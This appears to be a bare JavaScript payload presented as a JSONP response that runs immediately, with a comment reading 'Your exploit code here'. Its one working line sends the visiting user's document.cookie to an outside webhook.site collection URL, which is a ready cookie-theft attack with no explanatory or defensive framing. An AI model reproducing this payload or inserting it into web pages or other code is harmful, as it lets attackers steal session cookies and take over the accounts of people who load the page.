// This is a JSONP-style response that executes immediately
(function() {
    // Your exploit code here
    fetch('https://webhook.site/a85315b7-2be0-4070-b137-a3bda5f1ab12?cookie=' + encodeURIComponent(document.cookie));
})();